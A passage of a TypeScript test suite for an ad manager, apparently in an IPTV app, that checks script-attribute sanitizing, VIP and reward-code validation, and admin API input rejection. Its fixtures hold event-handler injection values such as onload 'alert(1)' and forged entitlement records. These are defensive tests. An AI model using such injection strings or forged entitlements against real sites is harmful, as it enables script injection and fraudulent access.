    getAttribute: (k: string) => (k === 'data-mrs-ad-approved' ? '1' : null),
  };
  const safeAppNode = { tagName: 'DIV', id: 'stream-list', className: 'channels', getAttribute: () => null };

  sb.Element.prototype.insertBefore.call(doc.head, otieuScript, null);
  sb.Element.prototype.insertBefore.call(doc.head, monetagDialog, null);
  sb.Element.prototype.insertBefore.call(doc.head, insecureApproved, null);
  sb.Element.prototype.insertBefore.call(doc.head, safeAppNode, null);

  assert.equal(inserted.includes(otieuScript), false);
  assert.equal(inserted.includes(monetagDialog), false);
  assert.equal(inserted.includes(insecureApproved), false);
  assert.equal(inserted.includes(safeAppNode), true);
  assert.equal(sb.open('https://nap5k.com/pop'), null);
});

test('31. Script injection enforces strict attribute whitelisting in monetagConfig.ts & ad-manager.js', async () => {
  const { sanitizeExternalScriptAttributes, isAllowedExternalScriptAttribute, ALLOWED_EXTERNAL_SCRIPT_ATTRS } = await import('../src/lib/monetagConfig.js');

  assert.equal(ALLOWED_EXTERNAL_SCRIPT_ATTRS.has('data-zone'), true);
  assert.equal(isAllowedExternalScriptAttribute('data-zone', '11242067'), true);
  assert.equal(isAllowedExternalScriptAttribute('data-zone', 'bad zone!'), false);
  assert.equal(isAllowedExternalScriptAttribute('ONLOAD', 'alert(1)'), false);
  assert.equal(isAllowedExternalScriptAttribute('id', 'spoof'), false);

  const cleaned = sanitizeExternalScriptAttributes({
    'data-zone': '11242067',
    'data-cfasync': 'FALSE',
    crossorigin: 'Anonymous',
    referrerpolicy: 'no-referrer',
    async: 'true',
    onload: 'alert(1)',
    id: 'spoofed-id',
    style: 'display:block',
    'data-evil': 'x"y',
  });
  assert.deepEqual(cleaned, {
    'data-zone': '11242067',
    'data-cfasync': 'false',
    crossorigin: 'anonymous',
    referrerpolicy: 'no-referrer',
    async: 'true',
  });

  // ad-manager.js only sets whitelisted attributes when injecting Monetag interstitial scripts
  const injected: any[] = [];
  const sb: any = {
    console, Date, Math, JSON, Promise, Error, parseInt, URL, Blob,
    setTimeout: () => 1, clearTimeout: () => {}, setInterval: () => 2, clearInterval: () => {},
    CustomEvent: class CustomEvent { type: string; detail: any; constructor(t: string, o?: any) { this.type = t; this.detail = o?.detail; } },
    addEventListener: () => {}, dispatchEvent: () => true,
    MRS_AD_STATE: 'free',
    MRS_ADS: { state: () => 'free', _trackLoadedScript: () => {} },
    MRS_ADS_CONFIG: {
      apiBaseUrl: '',
      testMode: false,
      monetag: {
        showRegularAds: true,
        directZones: [{ id: 'uplcm-11242067', zoneId: '11242067', url: 'https://uplcm.com/4/11242067', label: 'Z5' }],
        interstitial: {
          zoneId: '11242067',
          url: 'https://uplcm.com/4/11242067',
          scriptSrc: 'https://uplcm.com/4/interstitial-whitelist.js',
          attrs: {
            'data-zone': '11242067',
            'data-cfasync': 'false',
            onload: 'alert(1)',
            referrerpolicy: 'unsafe-url',
            id: 'hack-id',
          },
        },
      },
      caps: { interstitialCooldownMs: 180000, interstitialMaxPerDay: 5 },
    },
    navigator: { language: 'en-US', userAgent: 'Mozilla/5.0' },
    location: { pathname: '/', hash: '' },
    innerWidth: 1280,
    localStorage: { getItem: () => null, setItem: () => {}, removeItem: () => {} },
    sessionStorage: { getItem: () => null, setItem: () => {} },
    document: {
      readyState: 'complete',
      documentElement: { getAttribute: () => null },
      body: { appendChild: (el: any) => { if (el.tagName === 'SCRIPT') injected.push(el); } },
      querySelector: () => null,
      querySelectorAll: () => [],
      getElementById: () => null,
      createElement: (tag: string) => ({
        tagName: tag.toUpperCase(),
        attributes: {} as Record<string, string>,
        style: {},
        setAttribute(k: string, v: string) { this.attributes[k] = String(v); },
        getAttribute(k: string) { return this.attributes[k] || null; },
      }),
      addEventListener: () => {},
    },
    fetch: async () => ({
      ok: true, status: 200,
      json: async () => ({
        ok: true,
        data: {
          formats: { banner: true, sticky: false, popunder: false, interstitial: true, push: false },
          testMode: false,
          monetag: {
            showRegularAds: true,
            interstitialZoneId: '11242067',
            caps: { interstitialCooldownMs: 180000, interstitialMaxPerDay: 5 },
          },
        },
      }),
    }),
  };
  sb.window = sb;
  vm.runInNewContext(adManagerSource, sb, { filename: 'ad-manager.js' });
  await new Promise((r) => setTimeout(r, 25));

  assert.equal(injected.length, 1);
  assert.equal(injected[0].attributes['data-zone'], '11242067');
  assert.equal(injected[0].attributes['data-cfasync'], 'false');
  assert.equal(injected[0].attributes['onload'], undefined);
  assert.equal(injected[0].attributes['id'], undefined);
  assert.equal(injected[0].attributes['referrerpolicy'], 'strict-origin-when-downgrade');
});

test('32. VIP & entitlement validators handle sponsor_reward states, reward codes, missing expiry, and legacy rejection', async () => {
  const { detectClientVipState, isClientVipActive, getCachedEntitlement } = await import('../src/lib/mrsVip.js');
  const { getStoredAdFreeState, getDeviceId: getCodesDeviceId } = await import('../src/lib/codes.js');
  const origWindow = (globalThis as any).window;
  const origDocument = (globalThis as any).document;
  const origLocalStorage = (globalThis as any).localStorage;

  const mockStore = new Map<string, string>();
  const futureExp = new Date(Date.now() + 3600_000).toISOString();
  const pastExp = new Date(Date.now() - 3600_000).toISOString();

  const setupEnv = (deviceId = 'dev-sponsor-check-0001') => {
    mockStore.set('mrs_device_id', deviceId);
    (globalThis as any).localStorage = {
      getItem: (k: string) => (mockStore.has(k) ? mockStore.get(k)! : null),
      setItem: (k: string, v: string) => { mockStore.set(k, String(v)); },
      removeItem: (k: string) => { mockStore.delete(k); },
    };
    (globalThis as any).document = {
      cookie: '',
      documentElement: { getAttribute: () => 'free' },
    };
    (globalThis as any).window = {
      MRS_AD_STATE: 'free',
      MRS_ADS: { state: () => 'free', isVip: () => false },
    };
  };

  try {
    // 1. Active mrs_sponsor_reward_state
    mockStore.clear();
    setupEnv();
    mockStore.set('mrs_sponsor_reward_state', JSON.stringify({ status: 'active', expiresAt: futureExp }));
    const srActive = detectClientVipState();
    assert.equal(srActive.isVip, true);
    assert.equal(srActive.source, 'sponsor_reward');

    // 2. Pending sponsor reward token -> fail-closed pending state
    mockStore.clear();
    setupEnv();
    mockStore.set('mrs_sponsor_reward_state', JSON.stringify({ status: 'pending', token: 'pending-tok' }));
    const srPending = detectClientVipState();
    assert.equal(srPending.state, 'pending');
    assert.equal(srPending.isLocked, true);
    assert.equal(isClientVipActive(), false);

    // 3. Referral / Camellia codes recognized in codes.ts + detectClientVipState; unpaired REWARD_1H_VIP / SPONSOR_REWARD_* refused in codes.ts
    for (const refCode of ['CAMELLIA-REWARD-XYZ', 'REF-WELCOME-123', 'REFERRAL_VIP_1']) {
      mockStore.clear();
      setupEnv();
      const codesDev = getCodesDeviceId();
      mockStore.set('shahintv_adfree_activation', JSON.stringify({
        isActive: true,
        isAdFree: true,
        code: refCode,
        deviceId: codesDev,
        expiryDate: futureExp,
      }));
      const st = getStoredAdFreeState();
      assert.equal(st.isActive, true, `Expected active state for ${refCode}`);
      assert.equal(detectClientVipState().source, 'sponsor_reward', `Expected sponsor_reward source for ${refCode}`);
    }

    // Forged sponsor code without server entitlement is rejected by getStoredAdFreeState
    mockStore.clear();
    setupEnv();
    mockStore.set('shahintv_adfree_activation', JSON.stringify({
      isActive: true,
      isAdFree: true,
      code: 'SPONSOR_REWARD_1H',
      deviceId: getCodesDeviceId(),
      expiryDate: futureExp,
    }));
    assert.equal(getStoredAdFreeState().isActive, false);

    // Server-backed sponsor_reward entitlement activates codes.ts + mrsVip.ts + isVipOrLockedState
    mockStore.clear();
    setupEnv();
    mockStore.set('mrs_vip_entitlement', JSON.stringify({
      token: 'tok-sr-active',
      active: true,
      kind: 'sponsor_reward',
      plan: 'sponsor_reward',
      expiresAt: futureExp,
    }));
    assert.equal(detectClientVipState().source, 'sponsor_reward');
    assert.equal(isClientVipActive(), true);
    assert.equal(getStoredAdFreeState().isActive, true);
    setupEnv();

    // Missing expiryDate rejected
    mockStore.clear();
    setupEnv();
    mockStore.set('shahintv_adfree_activation', JSON.stringify({ isActive: true, isAdFree: true, code: 'REWARD_1H_VIP' }));
    assert.equal(getStoredAdFreeState().isActive, false);
    assert.equal(isClientVipActive(), false);

    // Device mismatch rejected
    mockStore.clear();
    setupEnv('dev-owner-0001');
    mockStore.set('shahintv_adfree_activation', JSON.stringify({
      isActive: true,
      isAdFree: true,
      code: 'CAMELLIA-REWARD-999',
      deviceId: 'other-device-9999',
      expiryDate: futureExp,
    }));
    assert.equal(getStoredAdFreeState().isActive, false);
    assert.equal(isClientVipActive(), false);

    // Legacy SPONSOR_REWARD_VIP rejected even in sponsor state and codes.ts
    mockStore.clear();
    setupEnv();
    mockStore.set('mrs_sponsor_reward_state', JSON.stringify({ status: 'active', code: 'SPONSOR_REWARD_VIP', expiresAt: futureExp }));
    assert.equal(isClientVipActive(), false);

    // Expired or revoked entitlement cleared/rejected by getCachedEntitlement & isClientVipActive
    mockStore.clear();
    setupEnv();
    mockStore.set('mrs_vip_entitlement', JSON.stringify({ token: 'tok-exp', kind: 'sponsor_reward', plan: 'sponsor_reward', expiresAt: pastExp }));
    assert.equal(getCachedEntitlement(), null);
    assert.equal(isClientVipActive(), false);

    // rewardAds.js treats sponsor_reward entitlement & mrs_sponsor_reward_state as VIP-locked
    const rewardStore = new Map<string, string>([
      ['mrs_sponsor_reward_state', JSON.stringify({ status: 'active', expiresAt: futureExp })],
    ]);
    const rSb: any = {
      console, Date, Math, JSON, Promise, Error, parseInt, Uint8Array,
      crypto: webcrypto,
      setTimeout: () => 1, clearTimeout: () => {}, setInterval: () => 2, clearInterval: () => {},
      CustomEvent: class CustomEvent { type: string; detail: any; constructor(t: string, o?: any) { this.type = t; this.detail = o?.detail; } },
      addEventListener: () => {}, dispatchEvent: () => true,
      MRS_AD_STATE: 'free',
      MRS_ADS_CONFIG: { apiBaseUrl: '', testMode: true, monetag: { rewarded: { enabled: true } } },
      __MRS_ADS_SERVER_CONFIG: { testMode: true, monetag: { rewardedEnabled: true }, rewards: { cooldownMinutes: 180, anyRewardedAvailable: true } },
      MRS_ADS: { state: () => 'free', enterVipMode: () => {}, refresh: async () => 'free' },
      localStorage: {
        getItem: (k: string) => (rewardStore.has(k) ? rewardStore.get(k)! : null),
        setItem: (k: string, v: string) => { rewardStore.set(k, String(v)); },
        removeItem: (k: string) => { rewardStore.delete(k); },
      },
      document: {
        readyState: 'complete',
        cookie: '',
        documentElement: { getAttribute: () => 'free' },
        body: { appendChild: () => {} },
        createElement: () => ({ style: {}, setAttribute: () => {}, innerHTML: '' }),
        getElementById: () => null,
        addEventListener: () => {},
      },
      fetch: async () => ({ ok: true, status: 200, json: async () => ({ ok: true, data: {} }) }),
    };
    rSb.window = rSb;
    vm.runInNewContext(rewardAdsSource, rSb, { filename: 'rewardAds.js' });
    assert.equal(rSb.MRS_REWARD_ADS.isAvailable().reason, 'vip_active');

    // Signed backend token with kind: 'sponsor_reward' validates cleanly against /api/status
    const { hashDevice } = await import('../server/mrs-iptv-backend/src/redeem.js');
    const srDev = 'sponsor-reward-dev-32';
    const srExpMs = Date.now() + 3600_000;
    const srIns = run(
      `INSERT INTO reward_grants(device_hash, ip_hash, network, granted_at, expires_at) VALUES (?, 'ip-sr-32', 'monetag', ?, ?)`,
      hashDevice(srDev),
      nowIso(),
      new Date(srExpMs).toISOString()
    );
    const srToken = signToken({
      v: 3,
      kind: 'sponsor_reward',
      gid: Number(srIns.lastInsertRowid),
      dev: hashDevice(srDev),
      plan: 'sponsor_reward',
      network: 'monetag',
      exp: Math.floor(srExpMs / 1000),
    });
    const srStatusRes = await fetch(`${baseUrl}/api/status?deviceId=${encodeURIComponent(srDev)}`, {
      headers: { Authorization: `Bearer ${srToken}` },
    });
    assert.equal(srStatusRes.status, 200);
    const srStatusJson = await srStatusRes.json() as any;
    assert.equal(srStatusJson.ok, true);
    assert.equal(srStatusJson.data.active, true);
    assert.equal(srStatusJson.data.plan, 'reward1h');
    assert.equal(srStatusJson.data.planCode, 'sponsor_reward');
  } finally {
    (globalThis as any).window = origWindow;
    (globalThis as any).document = origDocument;
    (globalThis as any).localStorage = origLocalStorage;
  }
});

test('33. adsRouter rejects conflicting interstitial zones, nulls, empty sub-objects, no-op toggles, and bad query/event inputs', async () => {
  // 1. Conflicting monetag.interstitialZoneId vs monetag.interstitial.zoneId
  const conflictRes = await fetch(`${baseUrl}/api/admin/ads/config`, {
    method: 'PUT',
    headers: { 'Content-Type': 'application/json', 'x-admin-token': 'test-admin-secret-123' },
    body: JSON.stringify({
      monetag: { interstitialZoneId: '11242067', interstitial: { zoneId: '11242744' } },
    }),
  });
  assert.equal(conflictRes.status, 400);
  assert.equal(((await conflictRes.json()) as any).error.code, 'invalid_zone_id');

  // 2. Explicit null / empty string for non-nullable IDs rejected
  for (const nullBody of [
    { monetag: { verificationId: null } },
    { monetag: { verificationId: '' } },
    { monetag: { vignetteZoneId: null } },
    { monetag: { interstitialZoneId: null } },
    { monetag: { interstitial: { zoneId: null } } },
    { monetag: { popunderZoneId: '' } },
  ]) {
    const res = await fetch(`${baseUrl}/api/admin/ads/config`, {
      method: 'PUT',
      headers: { 'Content-Type': 'application/json', 'x-admin-token': 'test-admin-secret-123' },
      body: JSON.stringify(nullBody),
    });
    assert.equal(res.status, 400, `Expected 400 for ${JSON.stringify(nullBody)}`);
  }

  // 3. Empty sub-objects rejected
  for (const emptySub of [
    { formats: {} },
    { monetag: {} },
    { monetag: { caps: {} } },
    { monetag: { interstitial: {} } },
    { monetag: { rewarded: {} } },
  ]) {
    const res = await fetch(`${baseUrl}/api/admin/ads/config`, {
      method: 'PUT',
      headers: { 'Content-Type': 'application/json', 'x-admin-token': 'test-admin-secret-123' },
      body: JSON.stringify(emptySub),
    });
    assert.equal(res.status, 400, `Expected 400 for empty sub-object ${JSON.stringify(emptySub)}`);
    assert.equal(((await res.json()) as any).error.code, 'invalid_ad_config');
  }

  // 4. No-op toggle payload rejected
  const noopToggle = await fetch(`${baseUrl}/api/admin/rewards/toggle`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'x-admin-token': 'test-admin-secret-123' },
    body: JSON.stringify({ network: 'monetag' }),
  });
  assert.equal(noopToggle.status, 400);
  assert.equal(((await noopToggle.json()) as any).error.code, 'invalid_ad_config');

  // 5. Invalid ?days query param rejected on report routes
  const badDaysReport = await fetch(`${baseUrl}/api/admin/ads/report?days=abc`, {
    headers: { 'x-admin-token': 'test-admin-secret-123' },
  });
  assert.equal(badDaysReport.status, 400);
  assert.equal(((await badDaysReport.json()) as any).error.code, 'invalid_query');

  const badRewardDays = await fetch(`${baseUrl}/api/admin/rewards/report?days=0`, {
    headers: { 'x-admin-token': 'test-admin-secret-123' },
  });
  assert.equal(badRewardDays.status, 400);
  assert.equal(((await badRewardDays.json()) as any).error.code, 'invalid_query');

  // 6. Malformed /api/ads/event, /api/rewards/start, and /api/rewards/claim inputs rejected
  const emptyEvents = await fetch(`${baseUrl}/api/ads/event`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ events: [] }),
  });
  assert.equal(emptyEvents.status, 400);

  const badEventType = await fetch(`${baseUrl}/api/ads/event`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ events: [{ eventType: 'bogus', format: 'banner' }] }),
  });
  assert.equal(badEventType.status, 400);

  const badNetworkType = await fetch(`${baseUrl}/api/rewards/start`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ deviceId: 'valid-device-id-33', network: { bad: true } }),
  });
  assert.equal(badNetworkType.status, 400);

  const badClaimType = await fetch(`${baseUrl}/api/rewards/claim`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ deviceId: 'valid-device-id-33', nonce: ['array-nonce'] }),
  });
  assert.equal(badClaimType.status, 400);
});








